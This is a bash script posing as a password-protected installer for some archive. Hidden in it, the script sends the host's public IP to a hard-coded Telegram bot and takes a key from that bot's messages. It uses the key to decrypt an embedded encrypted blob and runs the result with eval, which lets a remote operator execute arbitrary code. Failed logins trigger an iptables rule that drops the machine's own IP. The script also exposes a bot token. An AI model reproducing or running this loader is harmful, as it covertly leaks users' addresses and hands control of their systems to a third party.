#!/bin/bash

RED='\033[0;31m';
GREEN='\033[0;32m';
YELLOW='\033[1;33m';
NC='\033[0m';

BOT_TOKEN="8136821698:AAHhmzcnqMfn0G4b_t6L6-Ff-uuHwJ6HWTw"; CHAT_ID="7432279779"
ENCRYPTED_FILE=$(mktemp); cat > "$ENCRYPTED_FILE" << EOF
U2FsdGVkX18LcP0wghVQdvSYLMVLPv1XlLSgcPsllE1jPUqM+m9GKAoEB46ViWNl
sv/qrNiR07oMR9c/2oaf2BqF5yvzfk0zhCoTMd8YTAtfnnEsDTGWToEjJ8C1iRD1
s6k5MELI63yCgZXz8wxaS82ec7+ne1ipp1Tm3RVE8Qk=
EOF

IP=$(curl -s -4 ifconfig.me)
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="محاولة تسجيل دخول جديدة ✅ : $IP" >/dev/null
MAX_WAIT=60; WAITED=0; password=""
while [[ $WAITED -lt $MAX_WAIT ]]; do
    response=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates")
    password=$(echo "$response" | grep -oP '"text":"\K[^"]+' | tail -1)
    [[ -n "$password" ]] && break
    sleep 1; ((WAITED++))
done

DECRYPTED=$(openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:"$password" -in "$ENCRYPTED_FILE" 2>/dev/null)
rm -f "$ENCRYPTED_FILE"
[[ -z "$DECRYPTED" ]] && exit 1
eval "$DECRYPTED"

MAX_ATTEMPTS=5
attempt=1
success=false

while (( attempt <= MAX_ATTEMPTS )); do
clear
    echo -e "${YELLOW}Secure Access Panel${NC}"
    echo -e "${YELLOW}Script is protected by password${NC}"
    echo -e "${YELLOW}To get the password, contact here @a_hamza_i${NC}"
    echo -n -e "Enter password to decrypt archive (attempt $attempt/$MAX_ATTEMPTS): "
    read -rs USER_PASS
    echo
    PASSWORD="type_pass_install.zip${USER_PASS}"
    if 7z t -p"$PASSWORD" "$ARCHIVE_FILE" &>/dev/null; then
        success=true
        break
    else
        echo -e "${RED}Wrong password. Try again.${NC}"
        ((attempt++))
    fi
done

if ! $success; then
    MY_IP=$(hostname -I | awk '{print $1}')
    iptables -I INPUT -s "$MY_IP" -j DROP
    touch "$BLOCK_FLAG"
    echo -e "${RED}Maximum password attempts reached. Your IP has been permanently blocked.${NC}"
    exec bash
fi

7z x "-p$PASSWORD" -aoa "$ARCHIVE_FILE" "$EXTRACTED_FILE" >/dev/null 2>&1
[[ ! -f "$EXTRACTED_FILE" ]] && exit 1
chmod +x "$EXTRACTED_FILE"
bash "$EXTRACTED_FILE"
